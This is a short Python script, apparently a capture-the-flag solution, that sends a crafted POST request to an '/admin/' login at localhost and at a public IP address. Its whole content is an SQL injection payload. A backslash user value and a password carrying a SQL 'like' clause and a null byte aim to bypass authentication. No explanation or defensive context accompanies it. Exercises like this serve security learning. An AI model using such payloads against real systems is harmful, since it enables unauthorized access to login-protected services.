import requests 

url = "http://localhost:10000/"
url = "http://3.35.238.142:10000/"

r = requests.post(
    f"{url}/admin/", 
    data={
        "user": "\\",
        "pass": "^((id)like'1');\x00"
    },
)

print(r.text)